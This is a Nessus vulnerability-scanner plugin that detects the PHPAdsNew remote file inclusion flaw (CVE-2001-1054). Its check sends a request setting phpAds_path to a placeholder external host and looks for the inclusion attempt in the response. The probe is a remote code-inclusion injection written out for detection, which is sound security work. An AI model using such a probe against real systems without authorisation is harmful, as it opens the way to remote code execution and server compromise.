#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11101);
 script_bugtraq_id(3392);
 script_version ("$Revision: 1.11 $");
 script_cve_id("CVE-2001-1054");
 name["english"] = "PHPAdsNew code injection";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote host include php files hosted
on a third party server using PHPAdsNew.

An attacker may use this flaw to inject arbitrary code in the remote
host and gain a shell with the privileges of the web server.

Solution : Upgrade to PHPAdsNew Beta 6.1 or newer
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of remotehtmlview.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);



function check(loc)
{
 req = http_get(item:string(loc, "/remotehtmlview.php?phpAds_path=http://xxxxxxxx"),
 		port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(egrep(pattern:".*http://xxxxxxxx/dblib\.php.*", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}

check(loc:"");
foreach dir (cgi_dirs())
{
check(loc:dir);
}
